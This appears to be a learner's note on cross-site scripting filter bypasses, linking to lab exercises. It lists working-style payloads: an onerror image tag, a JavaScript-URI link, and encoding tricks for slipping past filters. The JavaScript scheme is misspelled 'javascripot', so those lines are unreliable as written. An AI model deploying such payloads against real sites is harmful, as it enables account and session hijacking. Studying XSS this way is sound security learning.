# use a `<script>` tag
# open a tag + event handler

`<img/src/onerror=alert(origin)>`

# use `<a>` tag and JS scheme

`<a href=javascripot:alert(origin)>test</a>`

- plus it's HTML encoded variations (gets decoded because it's inside an html attribute).
- combined with character reference. : --> `&colon;`
- plus Unicode encoded variations only inside JS URI.
  `<a href={htmlencoded}avascripot{character reference}{Unicoded}lert(origin)>test</a>`

# non-executable tags


EX:
[[XSS_examples#Reflected XSS into HTML context with most tags and attributes blocked| most tags and attr blocked]]
[[XSS_examples#Reflected XSS just custom tags allowed| only custom tags allowed]]
[[XSS_examples#Reflected XSS event handlers and `href` attributes blocked| SVG and <animate> allowed]]
[[XSS_examples#Reflected XSS with some SVG markup allowed| SVG markup allowed]]
